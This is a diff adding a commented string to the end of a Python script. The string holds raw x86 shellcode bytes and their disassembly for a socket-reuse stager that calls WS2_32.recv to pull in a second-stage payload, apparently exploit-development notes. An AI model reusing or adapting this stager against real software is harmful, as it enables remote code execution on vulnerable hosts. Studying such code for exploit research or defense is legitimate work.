@@ -32,3 +32,22 @@ def main():
 
 if __name__ == "__main__": 
     main()
+
+    
+'''
+54 59 66 81 E9 7C 02 83 EC 50 33 D2 52 80 C6 02 52 54 5A 80 C2 30 52 FF 31 E8 4B 2B 88 FF
+
+00B7F9C3   54               PUSH ESP
+00B7F9C4   59               POP ECX
+00B7F9C5   66:81E9 7C02     SUB CX,27C
+00B7F9CA   83EC 50          SUB ESP,50
+00B7F9CD   33D2             XOR EDX,EDX
+00B7F9CF   52               PUSH EDX
+00B7F9D0   80C6 02          ADD DH,2
+00B7F9D3   52               PUSH EDX
+00B7F9D4   54               PUSH ESP
+00B7F9D5   5A               POP EDX
+00B7F9D6   80C2 30          ADD DL,30
+00B7F9D9   52               PUSH EDX
+00B7F9DA   FF31             PUSH DWORD PTR DS:[ECX]
+00B7F9DC   E8 4B2B88FF      CALL <JMP.&WS2_32.recv>
